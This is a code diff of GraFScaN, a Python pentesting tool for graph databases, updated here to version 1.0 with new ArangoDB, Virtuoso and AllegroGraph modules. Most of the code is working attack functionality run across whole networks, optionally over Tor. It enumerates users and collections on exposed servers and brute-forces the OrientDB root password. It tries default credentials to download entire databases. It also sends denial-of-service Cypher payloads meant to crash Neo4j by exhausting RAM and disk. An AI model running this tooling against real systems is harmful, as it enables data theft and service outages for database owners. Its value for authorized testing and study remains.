@@ -8,6 +8,8 @@ import sys
 import json
 import argparse
 import ipaddress
+import os
+import shutil
 
 import socks
 import socket
@@ -15,25 +17,36 @@ import socket
 def banner():
     print(r"""
 
+
 	------------------------------------------
-	|           GraFScaN  - beta 0.1         |
+	|           GraFScaN  - V1.0             |
 	|					 |
 	| Authors: Miguel Hernández (@MiguelHzBz)|
 	|	   Alfonso Muñoz (@mindcrypt)    |
 	| Version: Beta 0.1	                 |
 	|					 |
-	| Date: March 3rd, 2017                  |
+	| Last Update: April 28, 2017            |
 	------------------------------------------
 
      A pentesting tool for graph databases
-     
+     List of graph database to be analyzed:
+
+          - Neo4j
+          - OrientDB
+          - ArangoDB
+          - AllegroGraph
+          - Virtuoso
+
+
     """)
 def dos_RamCpu(ip,url_query,headers):
 	print "Send loop to crash Neo4j..."
-	requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'FOREACH (x in range(1,10000000000000) | CREATE (:Person {name:"name"+x, age: x%100}));'}]},headers=headers,timeout=30).json()
+	payload_RAM = "{\"statements\":[{\"statement\":\"FOREACH (x in range(1,10000000000000) | CREATE (:Person {name:\"name\"+x, age: x%100}));\",\"parameters\":null,\"resultDataContents\":[\"row\",\"graph\"],\"includeStats\":true}]}"
+	requests.post(url_query,data= payload_RAM,headers=headers,timeout=30).json()
 def dos_disco2(ip,url_query,headers):
 	print "Load huge CSV..."
-	requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'USING PERIODIC COMMIT 1000 LOAD CSV FROM \"https://data.cityofchicago.org/api/views/ijzp-q8t2/rows.csv?accessType=DOWNLOAD\" AS row CREATE (A:NODO:NODO2:NODO3:NODO4 {a:row[0],b:row[1],c:row[3],d:row[4]})-[:RE]->(B:NODO5:NODO6:NODO7:NODO8 {zz:row[5],dd:row[6],qq:row[7],rr:row[8]});'}]},headers=headers,timeout=10).json()
+	payload_CSV = "{\"statements\":[{\"statement\":\"USING PERIODIC COMMIT 1000 LOAD CSV FROM \"https://data.cityofchicago.org/api/views/ijzp-q8t2/rows.csv?accessType=DOWNLOAD\" AS row CREATE (A:NODO:NODO2:NODO3:NODO4 {a:row[0],b:row[1],c:row[3],d:row[4]})-[:RE]->(B:NODO5:NODO6:NODO7:NODO8 {zz:row[5],dd:row[6],qq:row[7],rr:row[8]});\",\"parameters\":null,\"resultDataContents\":[\"row\",\"graph\"],\"includeStats\":true}]}"
+	requests.post(url_query,data=payload_CSV,headers=headers,timeout=10).json()
 def dos_disco1(ip,url_query,url_labels,url_props,headers):
 	print "Create all posible indexes"
 	l = []
@@ -43,7 +56,7 @@ def dos_disco1(ip,url_query,url_labels,url_props,headers):
 	for label in labels:
 		for prop in props:
 			g1 ={}
-			g1["statement"] = str("DROP INDEX ON:"+label+"("+prop+");")
+			g1["statement"] = str("CREATE INDEX ON:"+label+"("+prop+");")
 			l.append(g1)
 	g["statements"] = l
 	requests.post(url_query,json=g,headers=headers)
@@ -72,38 +85,158 @@ def bruteForce_Orient(ip,dictpassw):
 		if (r_server.status_code == 200):
 			return passw,r_server
 
-def analyzeIP_Orient(ip,args):
+def analyzeIP_ArangoDB(ip,args):
+	print "Start the ArangoDB module"
+	data_report_total = {}
+	listports = ['80','8080','8000','5001','5000','8529']
+	for port in listports:	
+		try:
+			url = "http://"+ip+":"+port+"/_api/version"
+			r = requests.get(url,timeout=1 )
+			if "arango" in r.headers['server'].lower():
+				data_report = {}
+				data_report['Arango']=True
+				data_report['IP']=ip
+				data_report['Port']=port
+				if (r.status_code == 200):
+					r_json = r.json()
+					data_report['Auth']= False
+					data_report['Version'] = r_json.get('version')
+					data_report['License'] = r_json.get('license')
+					url_collections = "http://"+ip+":"+port+"/_api/collection"
+					url_user = "http://"+ip+":"+port+"/_api/user"
+					url_database = "http://"+ip+":"+port+"/_api/database/user"
+					try:
+						r2 = requests.get(url_collections,timeout=1).json()
+						data_report['Collections'] = r2['result']
+						r3 = requests.get(url_user,timeout=1).json()
+						data_report['User'] = r3['result']
+						r4 = requests.get(url_database,timeout=1).json()
+						data_report['Databases'] = r4['result']
+
+					except Exception as e:
+						print "Error when tried to search more information."
+						print e
+
+				else:
+					data_report['Auth']=True
+				print "Saving report of ArangoDB"
+				data_report_total[port]= data_report					
+			else:
+				print "The ip: " + ip + " with port "+port+" isn't a ArangoDB."
+
+		except Exception as e:
+			print "The ip: " + ip + " with port "+port+" is not a ArangoDB graph database."
+			print e	
+	return data_report_total
+
+
+def analyzeIP_Virtuoso(ip,args):
+	print "Start the Virtuoso module"
+	data_report_total = {}
+	listports = ['80','8080','1111','8888','8889','8890','8001']
+	for port in listports:	
+		try:
+			url = "http://"+ip+":"+port+"/conductor"
+			r = requests.get(url,timeout=1 )
+			if "virtuoso" in r.headers['Server'].lower():
+				data_report = {}
+				data_report['Virtuoso']=True
+				data_report['IP']=ip
+				data_report['Port']=port
+				print "Saving report of Virtuoso database"
+				data_report_total[port]= data_report					
+			else:
+				print "The ip: " + ip + " with port "+port+" isn't a Virtuoso."
+
+		except Exception as e:
+			print "The ip: " + ip + " with port "+port+" is not a Virtuoso graph database."
+			print e	
+	return data_report_total
+
+def analyzeIP_Allegro(ip,args):
+	print "Start the AllegroGraph module"
+	data_report_total = {}
+	listports = ['80','8080','10035']
+	for port in listports:	
+		try:
+			url = "http://"+ip+":"+port+"/repositories"
+			r = requests.get(url,timeout=1 )
+			if "allegro" in r.headers['server'].lower():
+				data_report = {}
+				data_report['AllegroGraph']=True
+				data_report['IP']=ip
+				data_report['Port']=port
+				data_report['Repositories'] = r.text
+				url_catalogs = "http://"+ip+":"+port+"/catalogs"
+				url_user = "http://"+ip+":"+port+"/users"
+				url_database = "http://"+ip+":"+port+"/roles"
+				try:
+					r2 = requests.get(url_catalogs,timeout=1)
+					data_report['Catalogs'] = r2.text
+					r3 = requests.get(url_user,timeout=1)
+					if 'anonymous' in r3.text:
+						data_report['Anon_user'] = True
+					data_report['User'] = r3.text
+					r4 = requests.get(url_database,timeout=1)
+					data_report['Roles'] = r4.text
+
+				except Exception as e:
+					print "Error when tried to search more information."
+					print e
+				
+				print "Saving report of AllegroGraph database"
+				data_report_total[port]= data_report					
+			else:
+				print "The ip: " + ip + "  with port  "+port+" isn't a Allegro."
+
+		except Exception as e:
+			print "The ip: " + ip + " with port  "+port+" is not a Allegro graph database."
+			print e	
 	
+	return data_report_total
+
+def analyzeIP_Orient(ip,args):
+	print "Start the Orientdb module "	
 	data_report = {}
 	try:
 		url = "http://"+ip+":2480/listDatabases"
 		r = requests.get(url,auth=('neo4j', ''),timeout=1 )
-		if (r.status_code == 200):
-			json_response = r.json()
-			''' Para saber info del server es necesario romper la pass de root'''			
-			if args.bruteForce == True:
-				p,infoServer = bruteForce_Orient(ip,args.listPassw)
-            			data_report['server_pass'] = p
-				data_report['server_info'] = infoServer.json()
-
-			data_report['databases'] = json_response.get("databases")
-			data_report['version_OrientDB'] = r.headers['Server']
-			databases = json_response.get("databases")
-			for database in databases:		
-				url_database = "http://"+ip+":2480/export/"+database
-				defaultPass=['admin','reader','writer']
-				for dPass in defaultPass:
-					r_data = requests.get(url_database,stream=True,auth=(dPass,dPass),timeout=1)
-					if (r_data.status_code == 200):
-						if not os.path.exists(ip):
-    							os.makedirs(ip)
-						with open(ip+"/"+database+'.gz', 'wb') as out_file:
-							shutil.copyfileobj(r_data.raw, out_file)
-					break;
+		if "orientdb" in r.headers['server'].lower():
 			data_report['ip'] = ip
-			return data_report
-		else:
-			print "The ip: " + ip + " is a OrientDB but not auth."
+			data_report['version_OrientdB'] = r.headers['server']
+			if (r.status_code == 200):
+				json_response = r.json()
+				''' Required pass of root to get server information '''			
+				if args.bruteForce == True:
+					p,infoServer = bruteForce_Orient(ip,args.listPassw)
+		    			data_report['server_pass'] = p
+					data_report['server_info'] = infoServer.json()				
+				data_report['auth'] = False
+				data_report['databases'] = json_response.get("databases")
+				databases = json_response.get("databases")
+				for database in databases:		
+						url_database = "http://"+ip+":2480/export/"+database
+						defaultPass=['admin','reader','writer']
+						for dPass in defaultPass:
+							try:
+								r_data = requests.get(url_database,stream=True,auth=(dPass,dPass),timeout=10)
+								if (r_data.status_code == 200):
+									data_report[database + "_defaultcredentials"] = True
+									if not os.path.exists(ip):
+		    								os.makedirs(ip)
+									with open(ip+"/"+database+'.gz', 'wb') as out_file:
+										shutil.copyfileobj(r_data.raw, out_file)
+							except Exception as e:
+								print "Error when test default credentials"
+								print e	
+				data_report['ip'] = ip
+				print "Saving report of OrientDB"
+				
+			else:
+				data_report['auth'] = True
+				print "The ip: " + ip + " is a OrientDB but not auth."
+		return data_report
 
 	except Exception as e:
 		print "The ip: " + ip + " is not a OrientDB graph database."
@@ -112,6 +245,7 @@ def analyzeIP_Orient(ip,args):
 
 def analyzeIP_Neo4j(ip,args):
 	
+	print "Start the Neo4j module "
 	data_report = {}
 	try:
 		url = "http://"+ip+":7474/db/data"
@@ -119,6 +253,7 @@ def analyzeIP_Neo4j(ip,args):
 		if r.status_code == 200:
 			json_response = r.json()
 			data_report['version'] = json_response.get("neo4j_version")
+			print "This IP has a Neo4j graph database."
 			data_report['ip'] = ip
 			url_license = "http://" + ip + ":7474/db/manage/server/version"
 			data_report['license'] = requests.get(url_license,auth=('neo4j', ''),timeout=1 ).json()
@@ -144,11 +279,12 @@ def analyzeIP_Neo4j(ip,args):
 	    		data_report['props'] = requests.get(url_props,auth=('neo4j', ''),timeout=1 ).json()			
 					
 			''' Query to get some data of the graph database '''
-			url_query = "http://" + ip + ":7474/db/data/transaction/commit";
+			url_query = "http://" + ip + ":7474/db/data/transaction/commit"
 			if args.limit == False:
-				data_report['info'] = requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'MATCH (n)-[r]-(m) RETURN n,r,m LIMIT 20'}]},headers=headers).json()
+				payload = "{\"statements\":[{\"statement\":\"match (n) return n limit 20\",\"parameters\":null,\"resultDataContents\":[\"row\",\"graph\"],\"includeStats\":true}]}"
 			else:
-				data_report['info'] = requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'MATCH (n)-[r]-(m) RETURN n,r,m '}]},headers=headers).json()
+				payload = "{\"statements\":[{\"statement\":\"match (n) return n\",\"parameters\":null,\"resultDataContents\":[\"row\",\"graph\"],\"includeStats\":true}]}"
+			data_report['info'] = requests.post(url_query,data=payload,headers=headers).json()
 				
 			''' Part of a cluster '''
 			url_cluster_avalaible = "http://" + ip + ":7474/db/manage/server/ha/available"
@@ -178,9 +314,9 @@ def analyzeIP_Neo4j(ip,args):
 						pass
 					print "DoS end"
 				except Exception as e:
-					print "Error en la denegacion"
+					print "DoS Error"
 					print e
-					
+			print "Saving report of Neo4j database"
 			return data_report
 
 		elif r.status_code == 401:
@@ -208,6 +344,7 @@ def analyzeIP_Neo4j(ip,args):
 						data_report["old_passwd"]= passwd_old
 			    		else:
 						data_report["change_password"] = "no"
+				print "Saving report of Neo4j database"
 				return data_report
 			else:
 				print "The ip: " + ip + " is not a Neo4j graph database."
@@ -223,9 +360,13 @@ def getArguments(args):
     	listPassw=list()
 	listProxies=list()
 	arguments={}
-	parser = argparse.ArgumentParser(description='GraFScaN analyses Neo4j and OrientDB graph databases from Internet.')
-	parser.add_argument('-neo4j', dest='neo4j', action='store_true', help='Discover and analyse Neo4j Graph database')
-	parser.add_argument('-orient', dest='orient', action='store_true', help='Discover and analyse Orient Graph Database')
+	parser = argparse.ArgumentParser(description='GraFScaN analyses the input to search differents graph databases. Actually analyses Neo4j, OrientDB, ArangoDB, AllegroGraph and VirtuosoDB')
+	parser.add_argument('-neo4j', dest='neo4j', action='store_true', help='Discover and analyze Neo4j Graph database')
+	parser.add_argument('-orient', dest='orient', action='store_true', help='Discover and analyze Orient Graph Database')
+	parser.add_argument('-arango', dest='arango', action='store_true', help='Discover and analyze Arango Graph Database')
+	parser.add_argument('-virtuoso', dest='virtuoso', action='store_true', help='Discover and analyze virtuoso Graph Database')
+	parser.add_argument('-allegro', dest='allegro', action='store_true', help='Discover and analyze allegro Graph Database')
+	parser.add_argument('-all', dest='all', action='store_true', help='Discover and analyze All Graph Database')	
 
 	parser.add_argument('-ip', dest='ip', help='IP target to analyse.')
 	parser.add_argument('-n','--network', dest='net', help='Network target to analyse.')
@@ -243,11 +384,17 @@ def getArguments(args):
 	args = parser.parse_args()
 
     	if not args.ip and not args.fileinput and not args.net:
+		print "--------------"
+		print "Error in input arguments: "
 		print "Need one type of input, -i -ip or -n/--network"
+		print "--------------"
 		print parser.print_help()
 		sys.exit(-1)
-	elif not args.neo4j and not args.orient:
-		print "Need -neo4j or -orient argument"
+	elif not args.neo4j and not args.orient and not args.arango and not args.virtuoso and not args.allegro and not args.all:
+		print "--------------"
+		print "Error in input arguments: "		
+		print "Need -neo4j, -orient, -arango, -virtuoso, -allegro or -all argument"
+		print "--------------"
 		print parser.print_help()
 		sys.exit(-1)
 	else:
@@ -257,7 +404,9 @@ def getArguments(args):
 			try:
 				listIps = list(ipaddress.ip_network(unicode(args.net)).hosts())
 			except Exception as e:
-				print "Wrong value of the network.\n\n"
+				print "--------------"
+				print "Wrong value of the input network.\n\n"
+				print "--------------"
 				print parser.print_help()
 				sys.exit(-1)
 		if args.fileinput:
@@ -266,7 +415,9 @@ def getArguments(args):
 				for line in f:
 					listIps.append(line.strip())
 			except Exception as e:
+				print "--------------"
 				print "Wrong input file.\n\n"
+				print "--------------"
 				print parser.print_help()
 				sys.exit(-1)
 
@@ -277,7 +428,9 @@ def getArguments(args):
 				listPassw.append(line.strip())	
 			    args.listPassw = listPassw			
 			except Exception as e:
+			    print "--------------"
 			    print "Wrong dict file.\n\n"
+			    print "--------------"
 			    print parser.print_help()
 			    sys.exit(-1)
 			if args.neo4j:
@@ -287,8 +440,10 @@ def getArguments(args):
 						listProxies.append(line.strip())
 					args.listProxies = listProxies
 				except Exception as e:
-			    		print "Wrong proxies file.\n\n"
-			    		print parser.print_help()
+					print "--------------"			    
+					print "Wrong proxies file.\n\n"
+					print "--------------"			    		
+					print parser.print_help()
 			    		sys.exit(-1)
 	args.listIps = listIps
 	return args
@@ -297,22 +452,60 @@ def main():
 	banner()
 	results = []
 	args = getArguments(sys.argv)
+	print "Start the analyze: "
 	if args.tor == True:
 		    socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
 		    socket.socket = socks.socksocket
 	for ip in args.listIps:
-		if args.neo4j:
+		print "IP: " + ip
+		print "-----------------------"
+		if args.all:
+			dataN = analyzeIP_Neo4j(str(ip),args)
+			if dataN:
+				results.append(dataN)
+			dataO = analyzeIP_Orient(str(ip),args)
+			if dataO:
+				results.append(dataO)
+			dataA = analyzeIP_ArangoDB(str(ip),args)
+			if dataA:
+				results.append(dataA)
+			dataV = analyzeIP_Virtuoso(str(ip),args)
+			if dataV:
+				results.append(dataV)
+			dataAl = analyzeIP_Allegro(str(ip),args)
+			if dataAl:
+				results.append(dataAl)
+		elif args.neo4j:
 			data = analyzeIP_Neo4j(str(ip),args)
-			if (data is not None):
+			if data:
 				results.append(data)
-		if args.orient:
+		elif args.orient:
 			data = analyzeIP_Orient(str(ip),args)
-			if (data is not None):
+			if data:
 				results.append(data)
-	fileout = open(args.output, "w")
-	json_str = json.dumps(results)
-	fileout.write(json_str)
-	fileout.close()
+		elif args.arango:
+			data = analyzeIP_ArangoDB(str(ip),args)
+			if data:
+				results.append(data)
+		elif args.virtuoso:
+			data = analyzeIP_Virtuoso(str(ip),args)
+			if data:
+				results.append(data)
+		elif args.allegro:
+			data = analyzeIP_Allegro(str(ip),args)
+			if data:
+				results.append(data)	
+		else:
+			print "Error with arguments"
+	if results:
+		print "Writting the results in the output file: " + args.output
+		fileout = open(args.output, "w")
+		json_str = json.dumps(results)
+		fileout.write(json_str)
+		fileout.close()
+	else:
+		print "-----------"
+		print "No results"
 
 if __name__ == "__main__":
 	main()
